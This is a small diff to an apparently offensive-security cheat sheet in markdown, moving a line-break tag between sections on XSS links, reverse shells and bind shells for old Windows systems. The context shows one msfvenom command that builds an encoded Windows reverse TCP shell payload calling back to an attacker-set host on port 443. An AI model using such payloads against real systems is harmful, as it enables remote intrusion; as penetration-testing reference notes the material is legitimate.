@@ -74,7 +74,7 @@
 * Web Application
   * XSS - https://excess-xss.com/
   * XSS - https://www.veracode.com/security/xss
-
+<br>
 
 ## Reverse Shell
 ### Windows XP/Vista Ultimate
@@ -87,7 +87,6 @@
 
 msfvenom -p windows/shell_reverse_tcp LHOST=1192.168.x.x LPORT=443 -a x86 --platform=win -e x86/alpha_mixed -f raw
 ```
-<br>
 
 ## Bind Shell
 ### Windows XP/Vista Ultimate
